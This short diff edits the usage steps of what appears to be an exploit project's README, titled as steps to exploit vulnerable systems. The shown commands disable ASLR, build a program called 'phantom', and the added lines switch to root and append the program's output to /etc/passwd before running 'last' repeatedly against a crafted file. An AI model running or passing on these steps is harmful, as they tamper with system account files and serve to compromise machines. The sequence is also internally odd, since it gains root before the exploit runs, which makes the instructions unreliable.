@@ -30,7 +30,9 @@ Steps to exploit vulnerable systems (tested on a raspberry pi)...
 ```
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # disable ASLR
 gcc phantom.c -o phantom
-./phantom
+sudo su
+./phantom >> /etc/passwd
+exit
 [patch with necessary user]
 ./phantom
 ./last -f mtmp [repeat as necessary, for ASLR]
